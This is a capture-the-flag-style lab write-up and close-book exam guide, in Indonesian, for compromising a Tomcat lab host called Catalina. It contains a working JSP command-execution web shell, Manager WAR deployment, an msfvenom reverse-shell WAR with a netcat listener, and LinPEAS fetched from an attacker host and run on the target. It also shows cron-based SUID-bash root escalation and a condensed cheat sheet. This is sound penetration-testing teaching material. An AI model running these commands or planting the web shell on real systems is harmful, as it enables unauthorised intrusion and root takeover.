# Write-Up Lab Catalina — Panduan Ujian Close Book

> **Ruang lingkup:** hanya untuk laboratorium atau sistem yang telah memberikan izin pengujian.

## 0. Cara Menggunakan Catatan Ini

Pelajari dokumen ini dalam tiga lapisan:

```text
Lapisan 1: hafalkan rantai serangan dan mnemonic.
Lapisan 2: hafalkan indikator berhasil pada setiap fase.
Lapisan 3: latih command pada Cheat Sheet 60 Detik.
```

---

## 1. Peta Serangan

| Komponen | Nilai |
|---|---|
| Target | `192.168.56.117:8081` |
| Hostname | `catalina` |
| Service utama | Apache Tomcat |
| Celah awal | Tomcat Manager terekspos dan credential lemah |
| Credential | `tomcat:s3cret` |
| Foothold | Deploy WAR dan RCE sebagai `tomcat` |
| Privilege escalation | Root cron menjalankan script yang writable oleh group `tomcat` |
| Akses akhir | `euid=0(root)` |

### Rantai Serangan

```text
Recon
→ Tomcat Manager
→ credential tomcat:s3cret
→ deploy WAR
→ RCE sebagai tomcat
→ temukan root cron
→ script backup group-writable
→ SUID bash
→ root
```

### Mnemonic: R-C-W-C-R

```text
R = Recon
C = Credential
W = WAR
C = Cron
R = Root
```

### Checkpoint Ujian

| Fase | Indikator yang Dicari |
|---|---|
| Recon | `/manager/html` menghasilkan `401` |
| Credential | `/manager/text/list` menghasilkan `OK` |
| WAR | `uid=997(tomcat)` |
| Cron | `* * * * * root /opt/backup/backup.sh` |
| Permission | `-rwxrwxr-x root tomcat` |
| Root | `euid=0(root)` |

### Pilih Jalur yang Paling Mudah

| Tahap | Metode | Kelebihan | Kekurangan | Rekomendasi |
|---|---|---|---|---|
| Membuat foothold | **A. JSP manual + ZIP** | Tidak perlu `LHOST`, listener, atau Metasploit; mudah dipahami dan stabil | Command dijalankan satu per satu melalui HTTP | **Paling mudah untuk ujian close book** |
| Membuat foothold | **B. WAR dari msfvenom** | Langsung memperoleh reverse shell interaktif | Harus menentukan IP attacker, membuka listener, dan memastikan koneksi balik tidak diblokir | Pilih bila peserta nyaman dengan reverse shell |
| Enumerasi lokal | **A. Manual** | Cepat dan fokus pada cron yang sudah diketahui | Risiko melewatkan temuan jika tidak tahu apa yang dicari | **Paling cepat pada lab Catalina** |
| Enumerasi lokal | **B. LinPEAS** | Otomatis menyoroti cron, permission, SUID, capability, dan misconfiguration | Output panjang dan dapat membingungkan | Pilih untuk eksplorasi atau ketika jalur eskalasi belum diketahui |

Jalur yang disarankan untuk peserta:

```text
Pemula / ujian cepat : JSP manual → enumerasi manual → cron → SUID bash
Lebih otomatis        : msfvenom WAR → reverse shell → LinPEAS → cron → SUID bash
Jalur hybrid          : JSP manual → jalankan LinPEAS melalui command runner → cron → SUID bash
```

> Peserta cukup memilih satu metode foothold dan satu metode enumerasi. Tidak wajib menjalankan semua alternatif.

---

# Fase 1 — Recon Tomcat Manager

## 2. Tujuan

Menemukan service Tomcat dan memastikan endpoint administrasi tersedia.

## 3. Scan Service dan Direktori

```bash
TARGET="192.168.56.117"
WEB="http://192.168.56.117:8081"

nmap -Pn -sC -sV -p8081 "$TARGET"

dirsearch \
  -u "$WEB" \
  -e jsp,html,txt
```

Temuan penting:

```text
302 - /manager  → /manager/
302 - /manager/ → /manager/html
401 - /manager/html
401 - /manager/jmxproxy
401 - /manager/status/all
```

## 4. Validasi Manual

```bash
curl -i "$WEB/manager/html"
```

Indikator:

```text
HTTP/1.1 401
WWW-Authenticate: Basic realm="Tomcat Manager Application"
```

Makna:

```text
401 bukan berarti endpoint tidak ada.
401 membuktikan endpoint tersedia dan meminta autentikasi.
```

---

# Fase 2 — Credential Tomcat Manager

## 5. Tujuan

Mendapatkan dan memvalidasi credential yang memiliki hak deployment.

## 6. Scanning dengan Nikto

```bash
nikto -h "$WEB"
```

Temuan lab:

```text
/manager/html: Default account found
ID 'tomcat', PW 's3cret'
```

Credential:

```text
Username : tomcat
Password : s3cret
```

## 7. Validasi Credential

```bash
curl -s \
  -u tomcat:s3cret \
  "$WEB/manager/text/list"
```

Indikator:

```text
OK - Listed applications for virtual host [localhost]
```

Validasi informasi server:

```bash
curl -s \
  -u tomcat:s3cret \
  "$WEB/manager/text/serverinfo"
```

Kesimpulan:

```text
Credential valid.
Akun dapat mengakses Tomcat Manager text interface.
```

---

# Fase 3 — Deploy WAR dan RCE

## 8. Tujuan

Menyebarkan aplikasi WAR berisi JSP command runner dan memperoleh command execution sebagai user service.

## 9. Buat JSP Command Runner

```bash
mkdir -p ~/tomcat-lab/labcmd
cd ~/tomcat-lab/labcmd

cat > cmd.jsp <<'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    String[] command = {"/bin/sh", "-c", cmd};
    Process p = Runtime.getRuntime().exec(command);
    InputStream in = p.getInputStream();
    InputStream err = p.getErrorStream();

    byte[] buffer = new byte[4096];
    int len;

    out.println("<pre>");
    while ((len = in.read(buffer)) != -1) {
        out.write(new String(buffer, 0, len));
    }
    while ((len = err.read(buffer)) != -1) {
        out.write(new String(buffer, 0, len));
    }
    out.println("</pre>");
}
%>
EOF
```

## 10. Package dan Deploy WAR

```bash
zip -r labcmd.war cmd.jsp
```

Deploy:

```bash
curl \
  -u tomcat:s3cret \
  --upload-file labcmd.war \
  "$WEB/manager/text/deploy?path=/labcmd&update=true"
```

Indikator:

```text
OK - Deployed application at context path [/labcmd]
```

## 11. Validasi RCE

```bash
SHELL_URL="$WEB/labcmd/cmd.jsp"

curl -sG \
  --data-urlencode "cmd=id" \
  "$SHELL_URL"
```

Indikator:

```text
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

Makna:

```text
Deployment berhasil.
JSP diproses oleh Tomcat.
Command berjalan sebagai user tomcat.
```

## 9B. Metode B — Membuat WAR dengan msfvenom

Gunakan alternatif ini apabila peserta lebih nyaman bekerja dengan reverse shell interaktif. Ganti `ATTACKER_IP` dengan alamat IP Kali pada jaringan lab.

```bash
ATTACKER_IP="192.168.56.1"
LPORT="4444"

mkdir -p ~/tomcat-lab/msfvenom
cd ~/tomcat-lab/msfvenom

msfvenom \
  -p java/jsp_shell_reverse_tcp \
  LHOST="$ATTACKER_IP" \
  LPORT="$LPORT" \
  -f war \
  -o catalina-shell.war
```

Periksa isi WAR:

```bash
unzip -l catalina-shell.war
```

## 10B. Deploy WAR msfvenom

```bash
curl \
  -u tomcat:s3cret \
  --upload-file catalina-shell.war \
  "$WEB/manager/text/deploy?path=/catalina-shell&update=true"
```

Indikator:

```text
OK - Deployed application at context path [/catalina-shell]
```

## 11B. Menangkap Reverse Shell

Buka listener pada terminal Kali:

```bash
nc -lvnp 4444
```

Pada terminal lain, picu aplikasi:

```bash
curl -s "$WEB/catalina-shell/" >/dev/null
```

Apabila callback belum masuk, lihat nama file JSP di dalam WAR lalu akses langsung:

```bash
unzip -l catalina-shell.war | grep -E '\.jsp$'
# contoh pola pemanggilan:
curl -s "$WEB/catalina-shell/NAMA_FILE.jsp" >/dev/null
```

Setelah callback diterima, verifikasi:

```bash
id
whoami
hostname
```

Indikator:

```text
uid=997(tomcat) gid=997(tomcat)
tomcat
catalina
```

> Jika reverse shell tidak masuk, kemungkinan `LHOST` salah, listener belum aktif, atau koneksi balik diblokir. Gunakan kembali Metode A karena tidak bergantung pada callback.

---

# Fase 4 — Enumerasi Cron dan Permission

## 12. Tujuan

Mencari pekerjaan otomatis yang berjalan sebagai root dan file yang dapat diubah oleh user `tomcat`.

## 13. Verifikasi Identitas

```bash
curl -sG \
  --data-urlencode \
  "cmd=id; whoami; groups; pwd; hostname" \
  "$SHELL_URL"
```

Hasil penting:

```text
tomcat
catalina
```

## 14. Enumerasi Cron

```bash
curl -sG \
  --data-urlencode \
  "cmd=cat /etc/crontab 2>/dev/null; ls -lah /etc/cron.d 2>/dev/null" \
  "$SHELL_URL"
```

Baca cron custom:

```bash
curl -sG \
  --data-urlencode \
  "cmd=cat /etc/cron.d/backup; stat -c '%A %U %G %n' /etc/cron.d/backup" \
  "$SHELL_URL"
```

Temuan:

```text
* * * * * root /opt/backup/backup.sh
```

Artinya:

```text
Setiap menit, root menjalankan /opt/backup/backup.sh.
```

## 15. Periksa Permission Script

```bash
curl -sG \
  --data-urlencode \
  "cmd=stat -c '%A %U %G %n' /opt/backup/backup.sh; cat /opt/backup/backup.sh" \
  "$SHELL_URL"
```

Temuan kritis:

```text
-rwxrwxr-x root tomcat /opt/backup/backup.sh
```

Interpretasi:

```text
Owner root   : rwx
Group tomcat : rwx
Other        : r-x
```

Karena command runner berjalan sebagai user/group `tomcat`, script dapat diubah.

## 14B. Metode B — Enumerasi Otomatis dengan LinPEAS

LinPEAS membantu ketika peserta belum mengetahui bahwa jalur eskalasi berada pada cron. Jalankan hanya pada lab berizin dan simpan hasilnya di `/tmp`.

### Siapkan LinPEAS pada Kali

Cari salinan yang sudah tersedia:

```bash
find /usr/share -type f -iname 'linpeas.sh' 2>/dev/null | head
```

Apabila ditemukan, salin ke direktori kerja dan jalankan web server sederhana:

```bash
mkdir -p ~/tomcat-lab/tools
cp /usr/share/peass/linpeas/linpeas.sh ~/tomcat-lab/tools/linpeas.sh
cd ~/tomcat-lab/tools
python3 -m http.server 8000
```

Sesuaikan path hasil `find` bila lokasi file berbeda.

### Opsi B1 — Menjalankan LinPEAS dari Reverse Shell

```bash
curl -fsSL http://ATTACKER_IP:8000/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh -a | tee /tmp/linpeas.out
```

Fokuskan pencarian pada temuan Catalina:

```bash
grep -nEi 'cron|backup\.sh|writable|tomcat' /tmp/linpeas.out | head -100
```

### Opsi B2 — Menjalankan LinPEAS melalui JSP Command Runner

Karena pemindaian dapat memerlukan waktu, jalankan di background agar request HTTP tidak timeout:

```bash
ATTACKER_IP="192.168.56.1"

curl -sG \
  --data-urlencode \
  "cmd=curl -fsSL http://$ATTACKER_IP:8000/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && nohup /tmp/linpeas.sh -a > /tmp/linpeas.out 2>&1 &" \
  "$SHELL_URL"
```

Periksa apakah proses selesai dan cari hasil penting:

```bash
curl -sG \
  --data-urlencode \
  "cmd=pgrep -af linpeas || true; grep -nEi 'cron|backup\.sh|writable|tomcat' /tmp/linpeas.out 2>/dev/null | head -100" \
  "$SHELL_URL"
```

Temuan yang harus dikonfirmasi secara manual:

```text
/etc/cron.d/backup menjalankan /opt/backup/backup.sh sebagai root.
/opt/backup/backup.sh dimiliki root:tomcat dan writable oleh group tomcat.
```

Jangan langsung mengeksekusi rekomendasi otomatis. Gunakan LinPEAS untuk menemukan petunjuk, lalu validasi dengan `cat`, `stat`, dan `id`.

### Rumus Hafalan

```text
root cron + script writable oleh tomcat = command berjalan sebagai root
```

---

# Fase 5 — Root melalui Cron

## 16. Tujuan

Membuktikan eksekusi root, membuat SUID bash untuk shell root, lalu memulihkan script.

## 17. Backup Script dan Proof Non-Destruktif

Backup:

```bash
curl -sG \
  --data-urlencode \
  "cmd=cp /opt/backup/backup.sh /tmp/backup.sh.bak" \
  "$SHELL_URL"
```

Tambahkan proof:

```bash
curl -sG \
  --data-urlencode \
  "cmd=printf '\nid > /tmp/root_proof\n' >> /opt/backup/backup.sh" \
  "$SHELL_URL"
```

Setelah cron berjalan, cek:

```bash
curl -sG \
  --data-urlencode \
  "cmd=cat /tmp/root_proof; ls -l /tmp/root_proof" \
  "$SHELL_URL"
```

Indikator:

```text
uid=0(root) gid=0(root)
```

## 18. Membuat SUID Bash

Tambahkan payload:

```bash
curl -sG \
  --data-urlencode \
  "cmd=printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh" \
  "$SHELL_URL"
```

Cek file:

```bash
curl -sG \
  --data-urlencode \
  "cmd=ls -l /tmp/rootbash" \
  "$SHELL_URL"
```

Indikator:

```text
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

Jalankan:

```bash
curl -sG \
  --data-urlencode \
  "cmd=/tmp/rootbash -p -c 'id; whoami; hostname'" \
  "$SHELL_URL"
```

Indikator utama:

```text
euid=0(root)
root
catalina
```

> Opsi `-p` mempertahankan effective UID dari binary SUID.

---

# 19. Troubleshooting Inti

### `/manager/html` menghasilkan `404`

Pastikan port yang digunakan adalah `8081`, bukan port `80`.

### Credential valid di browser tetapi text interface menghasilkan `403`

Akun mungkin tidak memiliki role `manager-script`. Pada lab ini, keberhasilan dibuktikan dengan respons `OK` dari `/manager/text/list`.

### Deploy menghasilkan error

Periksa format WAR:

```bash
unzip -l labcmd.war
```

File `cmd.jsp` harus berada di dalam arsip.

### RCE menghasilkan `404`

Periksa context path dan nama file:

```text
/labcmd/cmd.jsp
```

### Root proof belum muncul

Cron berjalan setiap menit. Periksa kembali:

```bash
curl -sG --data-urlencode "cmd=date; cat /tmp/root_proof 2>/dev/null" "$SHELL_URL"
```

### `/tmp/rootbash` ada tetapi tidak root

Pastikan permission mengandung `s` pada posisi owner:

```text
-rwsr-xr-x
```

Jalankan dengan opsi `-p`.

---

# 20. Cleanup

Pulihkan script:

```bash
curl -sG \
  --data-urlencode \
  "cmd=cat /tmp/backup.sh.bak > /opt/backup/backup.sh" \
  "$SHELL_URL"
```

Hapus artefak root:

```bash
curl -sG \
  --data-urlencode \
  "cmd=/tmp/rootbash -p -c 'rm -f /tmp/rootbash /tmp/root_proof /tmp/backup.sh.bak'" \
  "$SHELL_URL"
```

Undeploy aplikasi yang digunakan:

```bash
# Jalur JSP manual
curl -s \
  -u tomcat:s3cret \
  "$WEB/manager/text/undeploy?path=/labcmd"

# Jalur msfvenom
curl -s \
  -u tomcat:s3cret \
  "$WEB/manager/text/undeploy?path=/catalina-shell"
```

Hapus file lokal:

```bash
rm -rf ~/tomcat-lab
```

---

# 21. Cheat Sheet 60 Detik

## Jalur A — Paling Mudah: JSP Manual + Enumerasi Manual

```bash
TARGET="192.168.56.117"
WEB="http://192.168.56.117:8081"

# Recon dan credential
nmap -Pn -sC -sV -p8081 "$TARGET"
nikto -h "$WEB"
curl -s -u tomcat:s3cret "$WEB/manager/text/list"

# Deploy WAR manual
mkdir -p ~/tomcat-lab/labcmd && cd ~/tomcat-lab/labcmd
# buat cmd.jsp sesuai bagian 9
zip -r labcmd.war cmd.jsp
curl -u tomcat:s3cret --upload-file labcmd.war \
"$WEB/manager/text/deploy?path=/labcmd&update=true"

# RCE dan enumerasi manual
SHELL_URL="$WEB/labcmd/cmd.jsp"
curl -sG --data-urlencode "cmd=id" "$SHELL_URL"
curl -sG --data-urlencode "cmd=cat /etc/cron.d/backup" "$SHELL_URL"
curl -sG --data-urlencode \
"cmd=stat -c '%A %U %G %n' /opt/backup/backup.sh" "$SHELL_URL"

# Root melalui cron
curl -sG --data-urlencode \
"cmd=cp /opt/backup/backup.sh /tmp/backup.sh.bak; printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh" \
"$SHELL_URL"

curl -sG --data-urlencode \
"cmd=/tmp/rootbash -p -c 'id; whoami'" \
"$SHELL_URL"
```

## Jalur B — Otomatis: msfvenom + LinPEAS

```bash
TARGET="192.168.56.117"
WEB="http://192.168.56.117:8081"
ATTACKER_IP="192.168.56.1"

# Buat dan deploy reverse-shell WAR
msfvenom -p java/jsp_shell_reverse_tcp \
LHOST="$ATTACKER_IP" LPORT=4444 -f war -o catalina-shell.war

curl -u tomcat:s3cret --upload-file catalina-shell.war \
"$WEB/manager/text/deploy?path=/catalina-shell&update=true"

# Terminal pertama
nc -lvnp 4444

# Terminal kedua: picu callback
curl -s "$WEB/catalina-shell/" >/dev/null

# Dari reverse shell: LinPEAS
curl -fsSL "http://$ATTACKER_IP:8000/linpeas.sh" -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh -a | tee /tmp/linpeas.out
grep -nEi 'cron|backup\.sh|writable|tomcat' /tmp/linpeas.out | head -100

# Konfirmasi dan eskalasi
cat /etc/cron.d/backup
stat -c '%A %U %G %n' /opt/backup/backup.sh
cp /opt/backup/backup.sh /tmp/backup.sh.bak
printf '\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' >> /opt/backup/backup.sh
/tmp/rootbash -p -c 'id; whoami'
```

---

# 22. Checklist Ujian

```text
[ ] Port 8081 dan Tomcat ditemukan
[ ] /manager/html menghasilkan 401
[ ] Credential tomcat:s3cret ditemukan
[ ] Credential tervalidasi pada text interface
[ ] Metode foothold dipilih: JSP manual atau msfvenom
[ ] WAR berhasil dibuat dan dideploy
[ ] RCE atau reverse shell terbukti sebagai tomcat
[ ] Metode enumerasi dipilih: manual atau LinPEAS
[ ] Root cron ditemukan dan dikonfirmasi manual
[ ] Script backup terbukti group-writable
[ ] Proof root berhasil
[ ] SUID bash dibuat
[ ] euid=0(root) terbukti
[ ] Script dipulihkan
[ ] WAR, LinPEAS, dan artefak pengujian dihapus
```

## Kalimat Hafalan

```text
Cari Manager, validasi tomcat:s3cret, pilih WAR manual atau msfvenom,
dapatkan akses sebagai tomcat, pilih enumerasi manual atau LinPEAS,
konfirmasi cron root dan script writable, buat SUID bash, jalankan -p, lalu root.
```
